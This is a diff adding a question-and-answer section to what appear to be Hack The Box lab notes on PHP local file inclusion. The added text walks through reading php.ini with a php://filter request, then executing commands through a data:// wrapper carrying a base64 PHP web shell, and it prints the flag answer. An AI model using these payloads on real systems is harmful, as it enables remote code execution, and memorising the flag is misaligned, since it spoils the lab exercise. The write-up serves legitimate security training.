@@ -64,3 +64,30 @@ extension=expect
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+## Questions
+1. Try to gain RCE using one of the PHP wrappers and read the flag at / **Answer: HTB{d!$46l3_r3m0t3_url_!nclud3}**
+   - First check if `allow_url_include` is on:
+        ```
+        GET /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini HTTP/1.1
+        ```
+        Grab the base64 encoded content in the HTMK response, decode it and look for `allow_url_include`:
+        ```
+        $ cat b64 | base64 -d | grep allow_url_include
+        allow_url_include = On
+        ```
+   - With `allow_url_include` enabled we can use the `data` wrapper attack:
+        ```
+        GET /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=ls+/ HTTP/1.1
+        
+        <SNIP>
+        37809e2f8952f06139011994726d9ef1.txt
+        <SNIP>
+        ```
+        ```
+        GET /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt HTTP/1.1
+        
+        <SNIP>
+        HTB{d!$46l3_r3m0t3_url_!nclud3}
+        <SNIP>
+        ```
